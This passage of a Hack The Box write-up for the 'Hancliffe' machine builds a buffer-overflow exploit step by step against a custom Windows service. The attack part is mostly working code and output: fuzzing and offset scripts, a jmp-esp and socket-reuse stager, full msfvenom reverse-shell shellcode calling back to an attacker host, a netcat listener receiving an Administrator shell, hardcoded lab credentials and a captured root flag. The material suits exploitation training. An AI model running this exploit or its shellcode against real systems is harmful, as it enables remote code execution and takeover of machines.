Input Your Code: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```


#### Fuzzing
We use `fuzzer.py` until the application crash inside Immunity Debugger.
```python
[root:/git/htb/hancliffe]# cat fuzzer.py
#!/usr/bin/python

import socket, time, sys

IP = "172.30.1.118"
PORT = 9086
timeout = 5
user = "alfiansyah"
passwd = "K3r4j@@nM4j@pAh!T"
fullname = "random-data"

buffer = []
counter = 20
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 20

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        s.send(user)
        s.recv(1024)
        s.send(passwd)
        s.recv(1024)
        s.send(fullname)
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(string)
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
```

When the application crashes EIP should be equal to **41414141**, the hex value of "AAAA".

```bash
[root:/git/htb/hancliffe]# ./fuzzer.py
Fuzzing with 20 bytes
Fuzzing with 40 bytes
Fuzzing with 60 bytes
Fuzzing with 80 bytes
Fuzzing with 100 bytes
Could not connect to 172.30.1.118:9086
```

![[Pasted image 20220112120514.png]]

-----

#### Crash Replication & Controlling EIP
Generate a cyclic pattern to find the exact offset of the crash. 
**Note:** the size must be **bigger** than the crash offset.
```bash
# Mona
!mona pc 130

# Metasploit
[root:/git/htb/hancliffe]# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 130
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A
```

Enter the cyclic pattern to your bof script **payload**:
```python
[root:/git/htb/hancliffe]# cat bof.py
#!/usr/bin/python

import socket

ip = "172.30.1.118"
port = 9519
user = "alfiansyah"
passwd = "K3r4j@@nM4j@pAh!T"
fullname = "random-data"

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print(s.recv(1024))
    s.send(user)
    print(s.recv(1024))
    s.send(passwd)
    print(s.recv(1024))
    s.send(fullname)
    print(s.recv(1024))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

Run the script and the application should crash:
```bash
[root:/git/htb/hancliffe]# ./bof.py
Welcome Brankas Application.

Username: 
Password: 
Login Successfully!

Sending evil buffer...
Done!
```

![[Pasted image 20220112121932.png]]

The EIP value is now **41326341**. Find the exact offset of the crash with either Mona or Metasploit:
```bash
# Mona
!mona findmsp -disance 130
[+] Examining registers
    EIP contains normal pattern : 0x41326341 (offset 66)

# Metasploit
[root:/git/htb/hancliffe]# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41326341
[*] Exact match at offset 66
```

Modify the `bof.py` and ..
.. set **offset** variable to 66
.. set **retn** varible to "BBBB"
.. clear the payload variable

```bash
[root:/git/htb/hancliffe]# cat bof.py
[... snip ...]
offset = 66
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""
```

Run `bof.py` again and the EIP should now be equal to **42424242**, the hex value of "BBBB", meaning we controll EIP.
![[Pasted image 20220112122842.png]]

-----

#### Finding a Jump Point
To get a deeper understanding of the binary, we can change the payload to `'\x43' * 500`. This would in theory give us 500 C's after EIP. 

```python
b = '\x41' * 66
b += '\x42' * 4
b += '\x43' * 500
```

If we load `MyFirstApp.exe` in x64dbg and fire the exploit, we see that at the point of crash, the stack pointer [`$esp`] is pointing to the area that directly follows the EIP overwrite - `0x0101FF18`.

![[Pasted image 20220113161832.png]]  ![[Pasted image 20220113162120.png]]

Although we sent a total of 500 bytes in this position, this has been heavily truncated to only 10 bytes. This is a big problem, as this won’t suffice for the operations we wish to carry out. However, we do have the full 66 byte `\x41` island that precedes the EIP overwrite at our disposal. As long as we can pass execution into the 10 byte island that follows the overwrite, we can do a short jump back into the 66 byte island.

As the `$esp` register is pointing at the 10 byte island, the first thing we need to do is locate an executable area of memory that contains a `jmp esp` instruction which is unaffected by ASLR so we can reliably hardcode our exploit to return to this address.

In **x64dbg**, we can do this by inspecting the `Memory Map` tab and looking at what DLLs are being used. We find 5 DLL's; `msvcrt.dll`, `kernelbase.dll`, `kernel32.dll`, `ws2_32.dll` & `ntdll.dll`. Take note of their respective base address, go to `Log` and run the command `imageinfo <base-dll-address>` to retrieve information from the PE header. If the `DLL Characteristics` flag is set to 0, no protection such as ASLR or DEP are enabled. 

````ad-note
This step can also be done in Immunity using Mona and is **much simpler**, just write: 
`!mona modules`

![[Pasted image 20220112151307.png]]

````

Unfortunate for us, all DLL's are protected and we have to bypass ASLR somehow. We have two options..

.. find a JMP ESP within the EXE itself.
.. create your own malicious DLL and inject it into the program.

The easiest of the two would be to find a jump point within the EXE, so lets go with that.

In **x64dbg** go to `Memory Map` tab and double click on the memory section marked as executable (`E` in Protection column) for myfirstapp.exe; `.text` in this case.

![[Pasted image 20220113165949.png]]

We are sent to the `CPU` tab, here press `CTRL+F` and search for `JMP ESP` and we find 5 jump points.
![[Pasted image 20220113170140.png]]

```ad-note
This can also be done in Immunity using Mona by writing:
`!mona jmp -r esp -cpb "\x00"`

![[Pasted image 20220112153501.png]]
```

Save the first address, `0x7190239F`. Now that we have an address of a `jmp esp` instruction that will take us to the 10 byte island after the EIP overwrite, we can replace `\x42\x42\x42\x42` in our exploit with said address (keep in mind, this needs to be in reverse order due to the use of little endian).

Our updated code should now look like this:
```python
#!/usr/bin/python
import socket
import os
import sys

ip = "172.30.1.118"
port = 9062
user = "alfiansyah"
passwd = "K3r4j@@nM4j@pAh!T"
fullname = "random-data"

b = '\x41' * 66
b += '\x9F\x23\x90\x71'
b += '\x43' * 500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print(s.recv(1024))
    s.send(user)
    print(s.recv(1024))
    s.send(passwd)
    print(s.recv(1024))
    s.send(fullname)
    print(s.recv(1024))
    print("Sending evil buffer...")
    s.send(b)
    print("Done!")
except:
    print("Could not connect.")
```

Before running the exploit again, set a breakpoint at our `jmp esp` instruction. Do so by going to the `CPU` tab, press `CTRL+G` and enter the address `7190239F`. Toggle a breakpoint by pressing F2, or use any of the menus - once breakpoint is applied the address field should turn red.

If we now run the exploit again, we will hit the breakpoint and after stepping into the call (blue arrow pointing down on a dot), we will be taken to our 10 byte island of `0x43`, meaning we control execution. 

![[Pasted image 20220113172107.png]]

Next we need to jump back to the start of the 66 byte island as mentioned earlier. To do this, we can use a short jump to go backwards. Rather than calculating the exact offset manually, x64dbg can do the heavy lifting for us here!

If we scroll up the `CPU` tab to find the start of the 66 byte island containing the `\x41` bytes, we can see there is a `0x41` at `0x00FCFED4` and also two which directly precede that.

![[Pasted image 20220113172419.png]]

We cannot copy the address of the first 2 bytes, but we can instead subtract 2 bytes from `0x00FCFED4` to get the address `0x00FCFED2`. Now, if we go back to where `$esp` is pointing (`0x00FCFF15`) and press the space bar whilst the instruction is highlighted, we will enter the `Assemble` screen.

In here, we can enter `jmp 0x00FCFED2`, hit `OK` and it will automatically calculate the distance and create a short jump for us; in this case, `EB BB`. If everything went correct you should now have a red arrow pointing up to the start of the `\x41` island. You can also verify this by pressing `G`.

![[Pasted image 20220113173311.png]]

We can now update the exploit to include this instruction before the `\x43` island that was previously in place and replace the remaining bytes in both the 66 byte and 10 byte islands with NOP sleds so that we can work with them a bit easier later when we are assembling our exploit in the debugger.

After making these changes, the exploit should look like this:
```python
#!/usr/bin/python
import socket
import os
import sys

ip = "172.30.1.118"
port = 9683
user = "alfiansyah"
passwd = "K3r4j@@nM4j@pAh!T"
fullname = "random-data"

b = '\x90' * 66                     # buffer
b += '\x9F\x23\x90\x71'             # jmp esp ; within the exe
b += '\xEB\xBB'                     # jmp 0x00FCFED2 ; start of \x41 island
b += '\x90' * 500                   # NOP sleds

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print(s.recv(1024))
    s.send(user)
    print(s.recv(1024))
    s.send(passwd)
    print(s.recv(1024))
    s.send(fullname)
    print(s.recv(1024))
    print("Sending evil buffer...")
    s.send(b)
    print("Done!")
except:
    print("Could not connect.")
```

If we execute the exploit again, we will now find ourselves in the 66 byte NOP sled that precedes the initial EIP overwrite:
![[Pasted image 20220113175039.png]]

---------------

#### Analysis & Socket Hunting
The first thing we need to do before we can start putting together any code is to figure out where we can **find the socket** that the data our exploit is sending is being received on.
Restart the application and set a break point at the either the `recv` or `call eax` funtions under the string `Input Your Code: `, in my case that is `0x71901D79`.

![[Pasted image 20220118091512.png]]

At the breakpoint we can see a few interesting things;

(1) The `recv` function ontop of the stack, as seen in the red box on the right.

Looking on [these Windows Docs](https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-recv) we see that the `recv` function looks like this:
```c
int recv(
  SOCKET s,
  char   *buf,
  int    len,
  int    flags
);
```

- The first argument (on the top of the stack) is the **socket** file descriptor; in this, case the value `0x130`
- The second argument is the **buffer**, i.e. a pointer to the area of memory that the data received via the socket will be stored. In this case, it will store the received data at `0x653C20`
- The third argument is the **amount** of data to expect. This has been set at `0x400` bytes (1024 bytes)
- The final argument is the flags that influence the behaviour of the function. As the default behaviour is being used, this is set to `0`


(2) We can also see just above the breakpoint `ebp-10` is moved to `eax`, and on the next instruction `eax` is moved onto the stack. This means that the socket descriptor is contained at `ebp-10`. 
We can confirm this in by searching for the address of `ebp-10` (`0x00eeff60`) in the Dump tabs. This gives us a way to **dynamically retrive the socket** descriptor for our payload.

To get the offset calculate `00eeff60` (`ebp-10`) - `00eeff18` (`esp`) = `0x48`


(3) For future referenses we also need to grab the address of the `recv` function. We find this value by either double clicking `call` or by looking at `eax` in the top right corner - `0x7323a0`.

(4) If you press **Step over** from the breakpoint you'll land on the next instruction (`sub esp,10`). Here you can confirm that your input data are in the buffer by searching for the buffer address (`0x653c20`) in the Dump tabs. 

**NOTE** : This last step has to be done quickly. If the value of `EAX` is set to `FFFFFFFF` (`SOCKET_ERROR`) when you reach `sub esp,10` that means you were to slow and the socket has closed. 

---------------

#### Writing the Socket Stager

**Disclaimer:** When finalizing this exploit at home the values of my binary differ from the one I had at work thus making some of the values different, although the calculation to get there are still the same. My distance for example is **not** `0x48` but instead `0x70`. Also, the `recv` address changed from `0x76b323a0` to `0x75dc23a0`.

Following the guidlines from [rastating](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/) we should get something like this:
```bash
push esp                    -> \x54
pop eax                     -> \x58
add ax,0x70                 -> \x66\x83\xc0\x70       # socket position
sub esp,0x70                -> \x83\xec\x70           # gain space, to close to esp
xor ebx,ebx                 -> \x31\xdb
push ebx                    -> \x53
add bh,0x4                  -> \x80\xc7\x04           # buffer size (0x400)
push ebx                    -> \x53
push esp                    -> \x54
pop ebx                     -> \x5b
add ebx,x64                 -> \x83\xc3\x64           # where to write payload
push ebx                    -> \x53
push dword ptr ds: [eax]    -> \xff\x30
mov eax,0x75dc23a0          -> \xa1\xac\x82\x90\x71   # recv address
call eax                    -> \xff\xd0               # call recv
call ebx                    -> \xff\xd3               # call payload
```

All the values can be translated to it's respective hex values using either metasploit `nasm_shell.rb` or `Immunity Debugger`. 

---------------

#### Finalising the Exploit
With out stager ready, we place it at the start of the 66 byte NOP sled in our exploit. It's important the stager doesn't overwrite the 66-byte buffer, but in our case this is not a problem.

Additionally, we will make the exploit wait a few seconds before it sends the final payload, to ensure that our stager has executed.

The exploit should now look like this:
```python
#!/usr/bin/python
import socket
import os
import sys

ip = "10.10.11.115"
port = 9999
user = "alfiansyah"
passwd = "K3r4j@@nM4j@pAh!T"
fullname = "asdf"

stager = b'\x90\x90\x90\x90\x54\x58\x66\x83'    # NOP sequence | push esp | pop eax | add ax,0x70
stager += b'\xc0\x70\x83\xec\x70\x31\xdb\x53'   # sub esp,0x70 | xor ebx,ebx | push ebx
stager += b'\x80\xc7\x04\x53\x54\x5b\x83\xc3'   # add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64
stager += b'\x64\x53\xff\x30\xa1\xac\x82\x90'   # push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0
stager += b'\x71\xff\xd0\xff\xd3'               # call eax | call ebx

buffer = stager
buffer += b'\x90' * (66 - len(stager))
buffer += b'\xa8\x23\x90\x71'                   # jmp esp ; within the exe
buffer += b'\xeb\xb9\x90\x90'                   # jmp to stager ; start of 66-byte island
buffer += b'\x90' * 500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Connected to target: 10.10.11.115:9999")
    s.recv(1024)
    s.send(user)
    s.recv(1024)
    s.send(passwd)
    s.recv(1024)
    s.send(fullname)
    s.recv(1024)
    s.send(buffer)
    print("[+] Sent stager, waiting 5 seconds...")
except:
    print("[-] Could not connect.")
```


Lastly we want to add a **payload** to the script. 
Remove generall bad characters `\x00`, `\x0a` (line feed) and `\x0d` (carriage return) and generate the payload.

```bash
[root:/git/htb/hancliffe]# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4488 -f python -v payload EXITFUNC=thread -b "\x00\xa0\x0d"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xbb\x19\x17\xb3\x1e\xda\xd6\xd9\x74\x24\xf4\x5d"
payload += b"\x29\xc9\xb1\x52\x31\x5d\x12\x83\xed\xfc\x03\x44"
payload += b"\x19\x51\xeb\x8a\xcd\x17\x14\x72\x0e\x78\x9c\x97"
payload += b"\x3f\xb8\xfa\xdc\x10\x08\x88\xb0\x9c\xe3\xdc\x20"
payload += b"\x16\x81\xc8\x47\x9f\x2c\x2f\x66\x20\x1c\x13\xe9"
payload += b"\xa2\x5f\x40\xc9\x9b\xaf\x95\x08\xdb\xd2\x54\x58"
payload += b"\xb4\x99\xcb\x4c\xb1\xd4\xd7\xe7\x89\xf9\x5f\x14"
payload += b"\x59\xfb\x4e\x8b\xd1\xa2\x50\x2a\x35\xdf\xd8\x34"
payload += b"\x5a\xda\x93\xcf\xa8\x90\x25\x19\xe1\x59\x89\x64"
payload += b"\xcd\xab\xd3\xa1\xea\x53\xa6\xdb\x08\xe9\xb1\x18"
payload += b"\x72\x35\x37\xba\xd4\xbe\xef\x66\xe4\x13\x69\xed"
payload += b"\xea\xd8\xfd\xa9\xee\xdf\xd2\xc2\x0b\x6b\xd5\x04"
payload += b"\x9a\x2f\xf2\x80\xc6\xf4\x9b\x91\xa2\x5b\xa3\xc1"
payload += b"\x0c\x03\x01\x8a\xa1\x50\x38\xd1\xad\x95\x71\xe9"
payload += b"\x2d\xb2\x02\x9a\x1f\x1d\xb9\x34\x2c\xd6\x67\xc3"
payload += b"\x53\xcd\xd0\x5b\xaa\xee\x20\x72\x69\xba\x70\xec"
payload += b"\x58\xc3\x1a\xec\x65\x16\x8c\xbc\xc9\xc9\x6d\x6c"
payload += b"\xaa\xb9\x05\x66\x25\xe5\x36\x89\xef\x8e\xdd\x70"
payload += b"\x78\xbb\x2b\x74\x76\xd3\x29\x88\x97\xab\xa7\x6e"
payload += b"\xfd\xbb\xe1\x39\x6a\x25\xa8\xb1\x0b\xaa\x66\xbc"
payload += b"\x0c\x20\x85\x41\xc2\xc1\xe0\x51\xb3\x21\xbf\x0b"
payload += b"\x12\x3d\x15\x23\xf8\xac\xf2\xb3\x77\xcd\xac\xe4"
payload += b"\xd0\x23\xa5\x60\xcd\x1a\x1f\x96\x0c\xfa\x58\x12"
payload += b"\xcb\x3f\x66\x9b\x9e\x04\x4c\x8b\x66\x84\xc8\xff"
payload += b"\x36\xd3\x86\xa9\xf0\x8d\x68\x03\xab\x62\x23\xc3"
payload += b"\x2a\x49\xf4\x95\x32\x84\x82\x79\x82\x71\xd3\x86"
payload += b"\x2b\x16\xd3\xff\x51\x86\x1c\x2a\xd2\xa6\xfe\xfe"
payload += b"\x2f\x4f\xa7\x6b\x92\x12\x58\x46\xd1\x2a\xdb\x62"
payload += b"\xaa\xc8\xc3\x07\xaf\x95\x43\xf4\xdd\x86\x21\xfa"
payload += b"\x72\xa6\x63"
```

Add payload to your script, making your final product looking like this:
```python
#!/usr/bin/python
import socket
import os
import sys
import time

ip = "10.10.11.115"
port = 9999
user = "alfiansyah"
passwd = "K3r4j@@nM4j@pAh!T"
fullname = "asdf"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4488 -f python -v payload EXITFUNC=thread -b "\x00\xa0\x0d"
payload =  b""
payload += b"\xbb\x19\x17\xb3\x1e\xda\xd6\xd9\x74\x24\xf4\x5d"
payload += b"\x29\xc9\xb1\x52\x31\x5d\x12\x83\xed\xfc\x03\x44"
payload += b"\x19\x51\xeb\x8a\xcd\x17\x14\x72\x0e\x78\x9c\x97"
payload += b"\x3f\xb8\xfa\xdc\x10\x08\x88\xb0\x9c\xe3\xdc\x20"
payload += b"\x16\x81\xc8\x47\x9f\x2c\x2f\x66\x20\x1c\x13\xe9"
payload += b"\xa2\x5f\x40\xc9\x9b\xaf\x95\x08\xdb\xd2\x54\x58"
payload += b"\xb4\x99\xcb\x4c\xb1\xd4\xd7\xe7\x89\xf9\x5f\x14"
payload += b"\x59\xfb\x4e\x8b\xd1\xa2\x50\x2a\x35\xdf\xd8\x34"
payload += b"\x5a\xda\x93\xcf\xa8\x90\x25\x19\xe1\x59\x89\x64"
payload += b"\xcd\xab\xd3\xa1\xea\x53\xa6\xdb\x08\xe9\xb1\x18"
payload += b"\x72\x35\x37\xba\xd4\xbe\xef\x66\xe4\x13\x69\xed"
payload += b"\xea\xd8\xfd\xa9\xee\xdf\xd2\xc2\x0b\x6b\xd5\x04"
payload += b"\x9a\x2f\xf2\x80\xc6\xf4\x9b\x91\xa2\x5b\xa3\xc1"
payload += b"\x0c\x03\x01\x8a\xa1\x50\x38\xd1\xad\x95\x71\xe9"
payload += b"\x2d\xb2\x02\x9a\x1f\x1d\xb9\x34\x2c\xd6\x67\xc3"
payload += b"\x53\xcd\xd0\x5b\xaa\xee\x20\x72\x69\xba\x70\xec"
payload += b"\x58\xc3\x1a\xec\x65\x16\x8c\xbc\xc9\xc9\x6d\x6c"
payload += b"\xaa\xb9\x05\x66\x25\xe5\x36\x89\xef\x8e\xdd\x70"
payload += b"\x78\xbb\x2b\x74\x76\xd3\x29\x88\x97\xab\xa7\x6e"
payload += b"\xfd\xbb\xe1\x39\x6a\x25\xa8\xb1\x0b\xaa\x66\xbc"
payload += b"\x0c\x20\x85\x41\xc2\xc1\xe0\x51\xb3\x21\xbf\x0b"
payload += b"\x12\x3d\x15\x23\xf8\xac\xf2\xb3\x77\xcd\xac\xe4"
payload += b"\xd0\x23\xa5\x60\xcd\x1a\x1f\x96\x0c\xfa\x58\x12"
payload += b"\xcb\x3f\x66\x9b\x9e\x04\x4c\x8b\x66\x84\xc8\xff"
payload += b"\x36\xd3\x86\xa9\xf0\x8d\x68\x03\xab\x62\x23\xc3"
payload += b"\x2a\x49\xf4\x95\x32\x84\x82\x79\x82\x71\xd3\x86"
payload += b"\x2b\x16\xd3\xff\x51\x86\x1c\x2a\xd2\xa6\xfe\xfe"
payload += b"\x2f\x4f\xa7\x6b\x92\x12\x58\x46\xd1\x2a\xdb\x62"
payload += b"\xaa\xc8\xc3\x07\xaf\x95\x43\xf4\xdd\x86\x21\xfa"
payload += b"\x72\xa6\x63"

stager = b'\x90\x90\x90\x90\x54\x58\x66\x83'    # NOP sequence | push esp | pop eax | add ax,0x70
stager += b'\xc0\x70\x83\xec\x70\x31\xdb\x53'   # sub esp,0x70 | xor ebx,ebx | push ebx
stager += b'\x80\xc7\x04\x53\x54\x5b\x83\xc3'   # add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64
stager += b'\x64\x53\xff\x30\xa1\xac\x82\x90'   # push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0
stager += b'\x71\xff\xd0\xff\xd3'               # call eax | call ebx

buffer = stager
buffer += b'\x90' * (66 - len(stager))
buffer += b'\xa8\x23\x90\x71'                   # jmp esp ; within the exe
buffer += b'\xeb\xb9\x90\x90'                   # jmp to stager ; start of 66-byte island
buffer += b'\x90' * 500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Connected to target: 10.10.11.115:9999")
    s.recv(1024)
    s.send(user)
    s.recv(1024)
    s.send(passwd)
    s.recv(1024)
    s.send(fullname)
    s.recv(1024)
    s.send(buffer)
    print("[+] Sent stager, waiting 5 seconds...")
    time.sleep(5)
    s.send(payload + b'\x90' * (1024 - len(payload)))
    print("[+] Sent payload, check for incomming shell!")
except:
    print("[-] Could not connect.")
```


Run the script to get Administrator shell!
```bash
[root:/git/htb/hancliffe]# ./final_bof.py
[+] Connected to target: 10.10.11.115:9999
[+] Sent stager, waiting 5 seconds...
[+] Sent payload, check for incomming shell!
```

```bash
[root:/git/htb/hancliffe]# nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.115] 54473
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hancliffe\administrator

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
5018882876cc460554809abe9140eb89
```

------

# References
**nginx parser logic:**
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

**nuxeo authentication bypass rce:**
https://github.com/mpgn/CVE-2018-16341

**firefox decrypt:**
https://github.com/unode/firefox_decrypt

**ascii, hex, bin, dec, converter**:
https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html

**buffer overflow:**
https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/
https://liodeus.github.io/2020/08/11/bufferOverflow.html
https://0xrick.github.io/binary-exploitation/bof5/
https://security.stackexchange.com/questions/236956/buffer-overflow-mona-modules-all-show-rebase-safeseh-aslr-true
https://blog.devgenius.io/buffer-overflow-tutorial-part4-1e80e90a2f03
https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow
https://snowscan.io/htb-writeup-bighead/#
http://mislusnys.github.io/post/htb-bighead/
